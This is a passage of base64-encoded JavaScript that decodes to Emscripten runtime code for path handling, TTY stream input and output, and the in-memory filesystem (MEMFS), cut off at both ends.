YnNvbHV0ZSkgew0KICAgICAgICAgIHBhdGggPSAnLic7DQogICAgICAgIH0NCiAgICAgICAgaWYgKHBhdGggJiYgdHJhaWxpbmdTbGFzaCkgew0KICAgICAgICAgIHBhdGggKz0gJy8nOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAoaXNBYnNvbHV0ZSA/ICcvJyA6ICcnKSArIHBhdGg7DQogICAgICB9LGRpcm5hbWU6ZnVuY3Rpb24ocGF0aCkgew0KICAgICAgICB2YXIgcmVzdWx0ID0gUEFUSC5zcGxpdFBhdGgocGF0aCksDQogICAgICAgICAgICByb290ID0gcmVzdWx0WzBdLA0KICAgICAgICAgICAgZGlyID0gcmVzdWx0WzFdOw0KICAgICAgICBpZiAoIXJvb3QgJiYgIWRpcikgew0KICAgICAgICAgIC8vIE5vIGRpcm5hbWUgd2hhdHNvZXZlcg0KICAgICAgICAgIHJldHVybiAnLic7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGRpcikgew0KICAgICAgICAgIC8vIEl0IGhhcyBhIGRpcm5hbWUsIHN0cmlwIHRyYWlsaW5nIHNsYXNoDQogICAgICAgICAgZGlyID0gZGlyLnN1YnN0cigwLCBkaXIubGVuZ3RoIC0gMSk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHJvb3QgKyBkaXI7DQogICAgICB9LGJhc2VuYW1lOmZ1bmN0aW9uKHBhdGgpIHsNCiAgICAgICAgLy8gRU1TQ1JJUFRFTiByZXR1cm4gJy8nJyBmb3IgJy8nLCBub3QgYW4gZW1wdHkgc3RyaW5nDQogICAgICAgIGlmIChwYXRoID09PSAnLycpIHJldHVybiAnLyc7DQogICAgICAgIHZhciBsYXN0U2xhc2ggPSBwYXRoLmxhc3RJbmRleE9mKCcvJyk7DQogICAgICAgIGlmIChsYXN0U2xhc2ggPT09IC0xKSByZXR1cm4gcGF0aDsNCiAgICAgICAgcmV0dXJuIHBhdGguc3Vic3RyKGxhc3RTbGFzaCsxKTsNCiAgICAgIH0sZXh0bmFtZTpmdW5jdGlvbihwYXRoKSB7DQogICAgICAgIHJldHVybiBQQVRILnNwbGl0UGF0aChwYXRoKVszXTsNCiAgICAgIH0sam9pbjpmdW5jdGlvbigpIHsNCiAgICAgICAgdmFyIHBhdGhzID0gQXJyYXkucHJvdG90eXBlLnNsaWNlLmNhbGwoYXJndW1lbnRzLCAwKTsNCiAgICAgICAgcmV0dXJuIFBBVEgubm9ybWFsaXplKHBhdGhzLmpvaW4oJy8nKSk7DQogICAgICB9LGpvaW4yOmZ1bmN0aW9uKGwsIHIpIHsNCiAgICAgICAgcmV0dXJuIFBBVEgubm9ybWFsaXplKGwgKyAnLycgKyByKTsNCiAgICAgIH19Ow0KICANCiAgDQogIHZhciBQQVRIX0ZTPXtyZXNvbHZlOmZ1bmN0aW9uKCkgew0KICAgICAgICB2YXIgcmVzb2x2ZWRQYXRoID0gJycsDQogICAgICAgICAgcmVzb2x2ZWRBYnNvbHV0ZSA9IGZhbHNlOw0KICAgICAgICBmb3IgKHZhciBpID0gYXJndW1lbnRzLmxlbmd0aCAtIDE7IGkgPj0gLTEgJiYgIXJlc29sdmVkQWJzb2x1dGU7IGktLSkgew0KICAgICAgICAgIHZhciBwYXRoID0gKGkgPj0gMCkgPyBhcmd1bWVudHNbaV0gOiBGUy5jd2QoKTsNCiAgICAgICAgICAvLyBTa2lwIGVtcHR5IGFuZCBpbnZhbGlkIGVudHJpZXMNCiAgICAgICAgICBpZiAodHlwZW9mIHBhdGggIT09ICdzdHJpbmcnKSB7DQogICAgICAgICAgICB0aHJvdyBuZXcgVHlwZUVycm9yKCdBcmd1bWVudHMgdG8gcGF0aC5yZXNvbHZlIG11c3QgYmUgc3RyaW5ncycpOw0KICAgICAgICAgIH0gZWxzZSBpZiAoIXBhdGgpIHsNCiAgICAgICAgICAgIHJldHVybiAnJzsgLy8gYW4gaW52YWxpZCBwb3J0aW9uIGludmFsaWRhdGVzIHRoZSB3aG9sZSB0aGluZw0KICAgICAgICAgIH0NCiAgICAgICAgICByZXNvbHZlZFBhdGggPSBwYXRoICsgJy8nICsgcmVzb2x2ZWRQYXRoOw0KICAgICAgICAgIHJlc29sdmVkQWJzb2x1dGUgPSBwYXRoLmNoYXJBdCgwKSA9PT0gJy8nOw0KICAgICAgICB9DQogICAgICAgIC8vIEF0IHRoaXMgcG9pbnQgdGhlIHBhdGggc2hvdWxkIGJlIHJlc29sdmVkIHRvIGEgZnVsbCBhYnNvbHV0ZSBwYXRoLCBidXQNCiAgICAgICAgLy8gaGFuZGxlIHJlbGF0aXZlIHBhdGhzIHRvIGJlIHNhZmUgKG1pZ2h0IGhhcHBlbiB3aGVuIHByb2Nlc3MuY3dkKCkgZmFpbHMpDQogICAgICAgIHJlc29sdmVkUGF0aCA9IFBBVEgubm9ybWFsaXplQXJyYXkocmVzb2x2ZWRQYXRoLnNwbGl0KCcvJykuZmlsdGVyKGZ1bmN0aW9uKHApIHsNCiAgICAgICAgICByZXR1cm4gISFwOw0KICAgICAgICB9KSwgIXJlc29sdmVkQWJzb2x1dGUpLmpvaW4oJy8nKTsNCiAgICAgICAgcmV0dXJuICgocmVzb2x2ZWRBYnNvbHV0ZSA/ICcvJyA6ICcnKSArIHJlc29sdmVkUGF0aCkgfHwgJy4nOw0KICAgICAgfSxyZWxhdGl2ZTpmdW5jdGlvbihmcm9tLCB0bykgew0KICAgICAgICBmcm9tID0gUEFUSF9GUy5yZXNvbHZlKGZyb20pLnN1YnN0cigxKTsNCiAgICAgICAgdG8gPSBQQVRIX0ZTLnJlc29sdmUodG8pLnN1YnN0cigxKTsNCiAgICAgICAgZnVuY3Rpb24gdHJpbShhcnIpIHsNCiAgICAgICAgICB2YXIgc3RhcnQgPSAwOw0KICAgICAgICAgIGZvciAoOyBzdGFydCA8IGFyci5sZW5ndGg7IHN0YXJ0KyspIHsNCiAgICAgICAgICAgIGlmIChhcnJbc3RhcnRdICE9PSAnJykgYnJlYWs7DQogICAgICAgICAgfQ0KICAgICAgICAgIHZhciBlbmQgPSBhcnIubGVuZ3RoIC0gMTsNCiAgICAgICAgICBmb3IgKDsgZW5kID49IDA7IGVuZC0tKSB7DQogICAgICAgICAgICBpZiAoYXJyW2VuZF0gIT09ICcnKSBicmVhazsNCiAgICAgICAgICB9DQogICAgICAgICAgaWYgKHN0YXJ0ID4gZW5kKSByZXR1cm4gW107DQogICAgICAgICAgcmV0dXJuIGFyci5zbGljZShzdGFydCwgZW5kIC0gc3RhcnQgKyAxKTsNCiAgICAgICAgfQ0KICAgICAgICB2YXIgZnJvbVBhcnRzID0gdHJpbShmcm9tLnNwbGl0KCcvJykpOw0KICAgICAgICB2YXIgdG9QYXJ0cyA9IHRyaW0odG8uc3BsaXQoJy8nKSk7DQogICAgICAgIHZhciBsZW5ndGggPSBNYXRoLm1pbihmcm9tUGFydHMubGVuZ3RoLCB0b1BhcnRzLmxlbmd0aCk7DQogICAgICAgIHZhciBzYW1lUGFydHNMZW5ndGggPSBsZW5ndGg7DQogICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgbGVuZ3RoOyBpKyspIHsNCiAgICAgICAgICBpZiAoZnJvbVBhcnRzW2ldICE9PSB0b1BhcnRzW2ldKSB7DQogICAgICAgICAgICBzYW1lUGFydHNMZW5ndGggPSBpOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHZhciBvdXRwdXRQYXJ0cyA9IFtdOw0KICAgICAgICBmb3IgKHZhciBpID0gc2FtZVBhcnRzTGVuZ3RoOyBpIDwgZnJvbVBhcnRzLmxlbmd0aDsgaSsrKSB7DQogICAgICAgICAgb3V0cHV0UGFydHMucHVzaCgnLi4nKTsNCiAgICAgICAgfQ0KICAgICAgICBvdXRwdXRQYXJ0cyA9IG91dHB1dFBhcnRzLmNvbmNhdCh0b1BhcnRzLnNsaWNlKHNhbWVQYXJ0c0xlbmd0aCkpOw0KICAgICAgICByZXR1cm4gb3V0cHV0UGFydHMuam9pbignLycpOw0KICAgICAgfX07DQogIA0KICB2YXIgVFRZPXt0dHlzOltdLGluaXQ6ZnVuY3Rpb24gKCkgew0KICAgICAgICAvLyBodHRwczovL2dpdGh1Yi5jb20vZW1zY3JpcHRlbi1jb3JlL2Vtc2NyaXB0ZW4vcHVsbC8xNTU1DQogICAgICAgIC8vIGlmIChFTlZJUk9OTUVOVF9JU19OT0RFKSB7DQogICAgICAgIC8vICAgLy8gY3VycmVudGx5LCBGUy5pbml0IGRvZXMgbm90IGRpc3Rpbmd1aXNoIGlmIHByb2Nlc3Muc3RkaW4gaXMgYSBmaWxlIG9yIFRUWQ0KICAgICAgICAvLyAgIC8vIGRldmljZSwgaXQgYWx3YXlzIGFzc3VtZXMgaXQncyBhIFRUWSBkZXZpY2UuIGJlY2F1c2Ugb2YgdGhpcywgd2UncmUgZm9yY2luZw0KICAgICAgICAvLyAgIC8vIHByb2Nlc3Muc3RkaW4gdG8gVVRGOCBlbmNvZGluZyB0byBhdCBsZWFzdCBtYWtlIHN0ZGluIHJlYWRpbmcgY29tcGF0aWJsZQ0KICAgICAgICAvLyAgIC8vIHdpdGggdGV4dCBmaWxlcyB1bnRpbCBGUy5pbml0IGNhbiBiZSByZWZhY3RvcmVkLg0KICAgICAgICAvLyAgIHByb2Nlc3NbJ3N0ZGluJ11bJ3NldEVuY29kaW5nJ10oJ3V0ZjgnKTsNCiAgICAgICAgLy8gfQ0KICAgICAgfSxzaHV0ZG93bjpmdW5jdGlvbigpIHsNCiAgICAgICAgLy8gaHR0cHM6Ly9naXRodWIuY29tL2Vtc2NyaXB0ZW4tY29yZS9lbXNjcmlwdGVuL3B1bGwvMTU1NQ0KICAgICAgICAvLyBpZiAoRU5WSVJPTk1FTlRfSVNfTk9ERSkgew0KICAgICAgICAvLyAgIC8vIGlub2xlbjogYW55IGlkZWEgYXMgdG8gd2h5IG5vZGUgLWUgJ3Byb2Nlc3Muc3RkaW4ucmVhZCgpJyB3b3VsZG4ndCBleGl0IGltbWVkaWF0ZWx5ICh3aXRoIHByb2Nlc3Muc3RkaW4gYmVpbmcgYSB0dHkpPw0KICAgICAgICAvLyAgIC8vIGlzYWFjczogYmVjYXVzZSBub3cgaXQncyByZWFkaW5nIGZyb20gdGhlIHN0cmVhbSwgeW91J3ZlIGV4cHJlc3NlZCBpbnRlcmVzdCBpbiBpdCwgc28gdGhhdCByZWFkKCkga2lja3Mgb2ZmIGEgX3JlYWQoKSB3aGljaCBjcmVhdGVzIGEgUmVhZFJlcSBvcGVyYXRpb24NCiAgICAgICAgLy8gICAvLyBpbm9sZW46IEkgdGhvdWdodCByZWFkKCkgaW4gdGhhdCBjYXNlIHdhcyBhIHN5bmNocm9ub3VzIG9wZXJhdGlvbiB0aGF0IGp1c3QgZ3JhYmJlZCBzb21lIGFtb3VudCBvZiBidWZmZXJlZCBkYXRhIGlmIGl0IGV4aXN0cz8NCiAgICAgICAgLy8gICAvLyBpc2FhY3M6IGl0IGlzLiBidXQgaXQgYWxzbyB0cmlnZ2VycyBhIF9yZWFkKCkgY2FsbCwgd2hpY2ggY2FsbHMgcmVhZFN0YXJ0KCkgb24gdGhlIGhhbmRsZQ0KICAgICAgICAvLyAgIC8vIGlzYWFjczogZG8gcHJvY2Vzcy5zdGRpbi5wYXVzZSgpIGFuZCBpJ2QgdGhpbmsgaXQnZCBwcm9iYWJseSBjbG9zZSB0aGUgcGVuZGluZyBjYWxsDQogICAgICAgIC8vICAgcHJvY2Vzc1snc3RkaW4nXVsncGF1c2UnXSgpOw0KICAgICAgICAvLyB9DQogICAgICB9LHJlZ2lzdGVyOmZ1bmN0aW9uKGRldiwgb3BzKSB7DQogICAgICAgIFRUWS50dHlzW2Rldl0gPSB7IGlucHV0OiBbXSwgb3V0cHV0OiBbXSwgb3BzOiBvcHMgfTsNCiAgICAgICAgRlMucmVnaXN0ZXJEZXZpY2UoZGV2LCBUVFkuc3RyZWFtX29wcyk7DQogICAgICB9LHN0cmVhbV9vcHM6e29wZW46ZnVuY3Rpb24oc3RyZWFtKSB7DQogICAgICAgICAgdmFyIHR0eSA9IFRUWS50dHlzW3N0cmVhbS5ub2RlLnJkZXZdOw0KICAgICAgICAgIGlmICghdHR5KSB7DQogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcig0Myk7DQogICAgICAgICAgfQ0KICAgICAgICAgIHN0cmVhbS50dHkgPSB0dHk7DQogICAgICAgICAgc3RyZWFtLnNlZWthYmxlID0gZmFsc2U7DQogICAgICAgIH0sY2xvc2U6ZnVuY3Rpb24oc3RyZWFtKSB7DQogICAgICAgICAgLy8gZmx1c2ggYW55IHBlbmRpbmcgbGluZSBkYXRhDQogICAgICAgICAgc3RyZWFtLnR0eS5vcHMuZmx1c2goc3RyZWFtLnR0eSk7DQogICAgICAgIH0sZmx1c2g6ZnVuY3Rpb24oc3RyZWFtKSB7DQogICAgICAgICAgc3RyZWFtLnR0eS5vcHMuZmx1c2goc3RyZWFtLnR0eSk7DQogICAgICAgIH0scmVhZDpmdW5jdGlvbihzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIHBvcyAvKiBpZ25vcmVkICovKSB7DQogICAgICAgICAgaWYgKCFzdHJlYW0udHR5IHx8ICFzdHJlYW0udHR5Lm9wcy5nZXRfY2hhcikgew0KICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoNjApOw0KICAgICAgICAgIH0NCiAgICAgICAgICB2YXIgYnl0ZXNSZWFkID0gMDsNCiAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGxlbmd0aDsgaSsrKSB7DQogICAgICAgICAgICB2YXIgcmVzdWx0Ow0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgcmVzdWx0ID0gc3RyZWFtLnR0eS5vcHMuZ2V0X2NoYXIoc3RyZWFtLnR0eSk7DQogICAgICAgICAgICB9IGNhdGNoIChlKSB7DQogICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDI5KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIChyZXN1bHQgPT09IHVuZGVmaW5lZCAmJiBieXRlc1JlYWQgPT09IDApIHsNCiAgICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoNik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAocmVzdWx0ID09PSBudWxsIHx8IHJlc3VsdCA9PT0gdW5kZWZpbmVkKSBicmVhazsNCiAgICAgICAgICAgIGJ5dGVzUmVhZCsrOw0KICAgICAgICAgICAgYnVmZmVyW29mZnNldCtpXSA9IHJlc3VsdDsNCiAgICAgICAgICB9DQogICAgICAgICAgaWYgKGJ5dGVzUmVhZCkgew0KICAgICAgICAgICAgc3RyZWFtLm5vZGUudGltZXN0YW1wID0gRGF0ZS5ub3coKTsNCiAgICAgICAgICB9DQogICAgICAgICAgcmV0dXJuIGJ5dGVzUmVhZDsNCiAgICAgICAgfSx3cml0ZTpmdW5jdGlvbihzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIHBvcykgew0KICAgICAgICAgIGlmICghc3RyZWFtLnR0eSB8fCAhc3RyZWFtLnR0eS5vcHMucHV0X2NoYXIpIHsNCiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDYwKTsNCiAgICAgICAgICB9DQogICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgbGVuZ3RoOyBpKyspIHsNCiAgICAgICAgICAgICAgc3RyZWFtLnR0eS5vcHMucHV0X2NoYXIoc3RyZWFtLnR0eSwgYnVmZmVyW29mZnNldCtpXSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgfSBjYXRjaCAoZSkgew0KICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoMjkpOw0KICAgICAgICAgIH0NCiAgICAgICAgICBpZiAobGVuZ3RoKSB7DQogICAgICAgICAgICBzdHJlYW0ubm9kZS50aW1lc3RhbXAgPSBEYXRlLm5vdygpOw0KICAgICAgICAgIH0NCiAgICAgICAgICByZXR1cm4gaTsNCiAgICAgICAgfX0sZGVmYXVsdF90dHlfb3BzOntnZXRfY2hhcjpmdW5jdGlvbih0dHkpIHsNCiAgICAgICAgICBpZiAoIXR0eS5pbnB1dC5sZW5ndGgpIHsNCiAgICAgICAgICAgIHZhciByZXN1bHQgPSBudWxsOw0KICAgICAgICAgICAgaWYgKEVOVklST05NRU5UX0lTX05PREUpIHsNCiAgICAgICAgICAgICAgLy8gd2Ugd2lsbCByZWFkIGRhdGEgYnkgY2h1bmtzIG9mIEJVRlNJWkUNCiAgICAgICAgICAgICAgdmFyIEJVRlNJWkUgPSAyNTY7DQogICAgICAgICAgICAgIHZhciBidWYgPSBCdWZmZXIuYWxsb2MgPyBCdWZmZXIuYWxsb2MoQlVGU0laRSkgOiBuZXcgQnVmZmVyKEJVRlNJWkUpOw0KICAgICAgICAgICAgICB2YXIgYnl0ZXNSZWFkID0gMDsNCiAgDQogICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgYnl0ZXNSZWFkID0gbm9kZUZTLnJlYWRTeW5jKHByb2Nlc3Muc3RkaW4uZmQsIGJ1ZiwgMCwgQlVGU0laRSwgbnVsbCk7DQogICAgICAgICAgICAgIH0gY2F0Y2goZSkgew0KICAgICAgICAgICAgICAgIC8vIENyb3NzLXBsYXRmb3JtIGRpZmZlcmVuY2VzOiBvbiBXaW5kb3dzLCByZWFkaW5nIEVPRiB0aHJvd3MgYW4gZXhjZXB0aW9uLCBidXQgb24gb3RoZXIgT1NlcywNCiAgICAgICAgICAgICAgICAvLyByZWFkaW5nIEVPRiByZXR1cm5zIDAuIFVuaWZvcm1pemUgYmVoYXZpb3IgYnkgdHJlYXRpbmcgdGhlIEVPRiBleGNlcHRpb24gdG8gcmV0dXJuIDAuDQogICAgICAgICAgICAgICAgaWYgKGUudG9TdHJpbmcoKS5pbmRleE9mKCdFT0YnKSAhPSAtMSkgYnl0ZXNSZWFkID0gMDsNCiAgICAgICAgICAgICAgICBlbHNlIHRocm93IGU7DQogICAgICAgICAgICAgIH0NCiAgDQogICAgICAgICAgICAgIGlmIChieXRlc1JlYWQgPiAwKSB7DQogICAgICAgICAgICAgICAgcmVzdWx0ID0gYnVmLnNsaWNlKDAsIGJ5dGVzUmVhZCkudG9TdHJpbmcoJ3V0Zi04Jyk7DQogICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgcmVzdWx0ID0gbnVsbDsNCiAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSBlbHNlDQogICAgICAgICAgICBpZiAodHlwZW9mIHdpbmRvdyAhPSAndW5kZWZpbmVkJyAmJg0KICAgICAgICAgICAgICB0eXBlb2Ygd2luZG93LnByb21wdCA9PSAnZnVuY3Rpb24nKSB7DQogICAgICAgICAgICAgIC8vIEJyb3dzZXIuDQogICAgICAgICAgICAgIHJlc3VsdCA9IHdpbmRvdy5wcm9tcHQoJ0lucHV0OiAnKTsgIC8vIHJldHVybnMgbnVsbCBvbiBjYW5jZWwNCiAgICAgICAgICAgICAgaWYgKHJlc3VsdCAhPT0gbnVsbCkgew0KICAgICAgICAgICAgICAgIHJlc3VsdCArPSAnXG4nOw0KICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2UgaWYgKHR5cGVvZiByZWFkbGluZSA9PSAnZnVuY3Rpb24nKSB7DQogICAgICAgICAgICAgIC8vIENvbW1hbmQgbGluZS4NCiAgICAgICAgICAgICAgcmVzdWx0ID0gcmVhZGxpbmUoKTsNCiAgICAgICAgICAgICAgaWYgKHJlc3VsdCAhPT0gbnVsbCkgew0KICAgICAgICAgICAgICAgIHJlc3VsdCArPSAnXG4nOw0KICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoIXJlc3VsdCkgew0KICAgICAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHR0eS5pbnB1dCA9IGludEFycmF5RnJvbVN0cmluZyhyZXN1bHQsIHRydWUpOw0KICAgICAgICAgIH0NCiAgICAgICAgICByZXR1cm4gdHR5LmlucHV0LnNoaWZ0KCk7DQogICAgICAgIH0scHV0X2NoYXI6ZnVuY3Rpb24odHR5LCB2YWwpIHsNCiAgICAgICAgICBpZiAodmFsID09PSBudWxsIHx8IHZhbCA9PT0gMTApIHsNCiAgICAgICAgICAgIG91dChVVEY4QXJyYXlUb1N0cmluZyh0dHkub3V0cHV0LCAwKSk7DQogICAgICAgICAgICB0dHkub3V0cHV0ID0gW107DQogICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGlmICh2YWwgIT0gMCkgdHR5Lm91dHB1dC5wdXNoKHZhbCk7IC8vIHZhbCA9PSAwIHdvdWxkIGN1dCB0ZXh0IG91dHB1dCBvZmYgaW4gdGhlIG1pZGRsZS4NCiAgICAgICAgICB9DQogICAgICAgIH0sZmx1c2g6ZnVuY3Rpb24odHR5KSB7DQogICAgICAgICAgaWYgKHR0eS5vdXRwdXQgJiYgdHR5Lm91dHB1dC5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICBvdXQoVVRGOEFycmF5VG9TdHJpbmcodHR5Lm91dHB1dCwgMCkpOw0KICAgICAgICAgICAgdHR5Lm91dHB1dCA9IFtdOw0KICAgICAgICAgIH0NCiAgICAgICAgfX0sZGVmYXVsdF90dHkxX29wczp7cHV0X2NoYXI6ZnVuY3Rpb24odHR5LCB2YWwpIHsNCiAgICAgICAgICBpZiAodmFsID09PSBudWxsIHx8IHZhbCA9PT0gMTApIHsNCiAgICAgICAgICAgIGVycihVVEY4QXJyYXlUb1N0cmluZyh0dHkub3V0cHV0LCAwKSk7DQogICAgICAgICAgICB0dHkub3V0cHV0ID0gW107DQogICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGlmICh2YWwgIT0gMCkgdHR5Lm91dHB1dC5wdXNoKHZhbCk7DQogICAgICAgICAgfQ0KICAgICAgICB9LGZsdXNoOmZ1bmN0aW9uKHR0eSkgew0KICAgICAgICAgIGlmICh0dHkub3V0cHV0ICYmIHR0eS5vdXRwdXQubGVuZ3RoID4gMCkgew0KICAgICAgICAgICAgZXJyKFVURjhBcnJheVRvU3RyaW5nKHR0eS5vdXRwdXQsIDApKTsNCiAgICAgICAgICAgIHR0eS5vdXRwdXQgPSBbXTsNCiAgICAgICAgICB9DQogICAgICAgIH19fTsNCiAgDQogIHZhciBNRU1GUz17b3BzX3RhYmxlOm51bGwsbW91bnQ6ZnVuY3Rpb24obW91bnQpIHsNCiAgICAgICAgcmV0dXJuIE1FTUZTLmNyZWF0ZU5vZGUobnVsbCwgJy8nLCAxNjM4NCB8IDUxMSAvKiAwNzc3ICovLCAwKTsNCiAgICAgIH0sY3JlYXRlTm9kZTpmdW5jdGlvbihwYXJlbnQsIG5hbWUsIG1vZGUsIGRldikgew0KICAgICAgICBpZiAoRlMuaXNCbGtkZXYobW9kZSkgfHwgRlMuaXNGSUZPKG1vZGUpKSB7DQogICAgICAgICAgLy8gbm8gc3VwcG9ydGVkDQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoNjMpOw0KICAgICAgICB9DQogICAgICAgIGlmICghTUVNRlMub3BzX3RhYmxlKSB7DQogICAgICAgICAgTUVNRlMub3BzX3RhYmxlID0gew0KICAgICAgICAgICAgZGlyOiB7DQogICAgICAgICAgICAgIG5vZGU6IHsNCiAgICAgICAgICAgICAgICBnZXRhdHRyOiBNRU1GUy5ub2RlX29wcy5nZXRhdHRyLA0KICAgICAgICAgICAgICAgIHNldGF0dHI6IE1FTUZTLm5vZGVfb3BzLnNldGF0dHIsDQogICAgICAgICAgICAgICAgbG9va3VwOiBNRU1GUy5ub2RlX29wcy5sb29rdXAsDQogICAgICAgICAgICAgICAgbWtub2Q6IE1FTUZTLm5vZGVfb3BzLm1rbm9kLA0KICAgICAgICAgICAgICAgIHJlbmFtZTogTUVNRlMubm9kZV9vcHMucmVuYW1lLA0KICAgICAgICAgICAgICAgIHVubGluazogTUVNRlMubm9kZV9vcHMudW5saW5rLA0KICAgICAgICAgICAgICAgIHJtZGlyOiBNRU1GUy5ub2RlX29wcy5ybWRpciwNCiAgICAgICAgICAgICAgICByZWFkZGlyOiBNRU1GUy5ub2RlX29wcy5yZWFkZGlyLA0KICAgICAgICAgICAgICAgIHN5bWxpbms6IE1FTUZTLm5vZGVfb3BzLnN5bWxpbmsNCiAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgc3RyZWFtOiB7DQogICAgICAgICAgICAgICAgbGxzZWVrOiBNRU1GUy5zdHJlYW1fb3BzLmxsc2Vlaw0KICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgZmlsZTogew0KICAgICAgICAgICAgICBub2RlOiB7DQogICAgICAgICAgICAgICAgZ2V0YXR0cjogTUVNRlMubm9kZV9vcHMuZ2V0YXR0ciwNCiAgICAgICAgICAgICAgICBzZXRhdHRyOiBNRU1GUy5ub2RlX29wcy5zZXRhdHRyDQogICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgIHN0cmVhbTogew0KICAgICAgICAgICAgICAgIGxsc2VlazogTUVNRlMuc3RyZWFtX29wcy5sbHNlZWssDQogICAgICAgICAgICAgICAgcmVhZDogTUVNRlMuc3RyZWFtX29wcy5yZWFkLA0KICAgICAgICAgICAgICAgIHdyaXRlOiBNRU1GUy5zdHJlYW1fb3BzLndyaXRlLA0KICAgICAgICAgICAgICAgIGFsbG9jYXRlOiBNRU1GUy5zdHJlYW1fb3BzLmFsbG9jYXRlLA0KICAgICAgICAgICAgICAgIG1tYXA6IE1FTUZTLnN0cmVhbV9vcHMubW1hcCwNCiAgICAgICAgICAgICAgICBtc3luYzogTUVNRlMuc3RyZWFtX29wcy5tc3luYw0KICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgbGluazogew0KICAgICAgICAgICAgICBub2RlOiB7DQogICAgICAgICAgICAgICAgZ2V0YXR0cjogTUVNRlMubm9kZV9vcHMuZ2V0YXR0ciwNCiAgICAgICAgICAgICAgICBzZXRhdHRyOiBNRU1GUy5ub2RlX29wcy5zZXRhdHRyLA0KICAgICAgICAgICAgICAgIHJlYWRsaW5rOiBNRU1GUy5ub2RlX29wcy5yZWFkbGluaw0KICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICBzdHJlYW06IHt9DQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgY2hyZGV2OiB7DQogICAgICAgICAgICAgIG5vZGU6IHsNCiAgICAgICAgICAgICAgICBnZXRhdHRyOiBNRU1GUy5ub2RlX29wcy5nZXRhdHRyLA0KICAgICAgICAgICAgICAgIHNldGF0dHI6IE1FTUZTLm5vZGVfb3BzLnNldGF0dHINCiAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgc3RyZWFtOiBGUy5jaHJkZXZfc3RyZWFtX29wcw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH07DQogICAgICAgIH0NCiAgICAgICAgdmFyIG5vZGUgPSBGUy5jcmVhdGVOb2RlKHBhcmVudCwgbmFtZSwgbW9kZSwgZGV2KTsNCiAgICAgICAgaWYgKEZTLmlzRGlyKG5vZGUubW9kZSkpIHsNCiAgICAgICAgICBub2RlLm5vZGVfb3BzID0gTUVNRlMub3BzX3RhYmxlLmRpci5ub2RlOw0KICAgICAgICAgIG5vZGUuc3RyZWFtX29wcyA9IE1FTUZTLm9wc190YWJsZS5kaXIuc3RyZWFtOw0KICAgICAgICAgIG5vZGUuY29udGVudHMgPSB7fTsNCiAgICAgICAgfSBlbHNlIGlmIChGUy5pc0ZpbGUobm9kZS5tb2RlKSkgew0KICAgICAgICAgIG5vZGUubm9kZV9vcHMgPSBNRU1GUy5vcHNfdGFibGUuZmlsZS5ub2RlOw0KICAgICAgICAgIG5vZGUuc3RyZWFtX29wcyA9IE1FTUZTLm9wc190YWJsZS5maWxlLnN0cmVhbTsNCiAgICAgICAgICBub2RlLnVzZWRCeXRlcyA9IDA7IC8vIFRoZSBhY3R1YWwgbnVtYmVyIG9mIGJ5dGVzIHVzZWQgaW4gdGhlIHR5cGVkIGFycmF5LCBhcyBvcHBvc2VkIHRvIGNvbnRlbnRzLmxlbmd0aCB3aGljaCBnaXZlcyB0aGUgd2hvbGUgY2FwYWNpdHkuDQogICAgICAgICAgLy8gV2hlbiB0aGUgYnl0ZSBkYXRhIG9mIHRoZSBmaWxlIGlzIHBvcHVsYXRlZCwgdGhpcyB3aWxsIHBvaW50IHRvIGVpdGhlciBhIHR5cGVkIGFycmF5LCBvciBhIG5vcm1hbCBKUyBhcnJheS4gVHlwZWQgYXJyYXlzIGFyZSBwcmVmZXJyZWQNCiAgICAgICAgICAvLyBmb3IgcGVyZm9ybWFuY2UsIGFuZCB1c2VkIGJ5IGRlZmF1bHQuIEhvd2V2ZXIsIHR5cGVkIGFycmF5cyBhcmUgbm90IHJlc2l6YWJsZSBsaWtlIG5vcm1hbCBKUyBhcnJheXMgYXJlLCBzbyB0aGVyZSBpcyBhIHNtYWxsIGRpc2sgc2l6ZQ0KICAgICAgICAgIC8vIHBlbmFsdHkgaW52b2x2ZWQgZm9yIGFwcGVuZGluZyBmaWxlIHdyaXRlcyB0aGF0IGNvbnRpbnVvdXNseSBncm93IGEgZmlsZSBzaW1pbGFyIHRvIHN0ZDo6dmVjdG9yIG